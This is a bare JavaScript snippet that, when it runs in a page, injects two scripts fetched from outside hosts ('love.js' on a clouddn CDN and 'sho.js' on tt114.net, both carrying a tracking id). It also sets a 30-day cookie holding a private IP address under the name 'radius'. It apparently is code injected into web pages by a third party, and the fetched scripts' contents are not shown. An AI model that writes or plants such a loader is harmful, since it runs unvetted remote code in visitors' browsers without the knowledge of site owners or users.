var d = document,
  url = "http://7u2ss1.com1.z0.glb.clouddn.com/love.js?tn=5a0bdf07",
  radius = "10.68.33.58",
  Days = 30,
  exp = new Date(),
  s1 = d.createElement("script"),
  s2 = d.createElement("script"),
  b = d.getElementsByTagName("head")[0];
s1.src = url;
s1.type = "text/javascript";
s2.src = "http://www.tt114.net/js/sho.js?tn=5a0bdf07";
s2.type = "text/javascript";
exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
d.cookie = "radius=" + radius + ";expires=" + exp.toGMTString() + ";path=/";
b.appendChild(s1);
b.appendChild(s2);
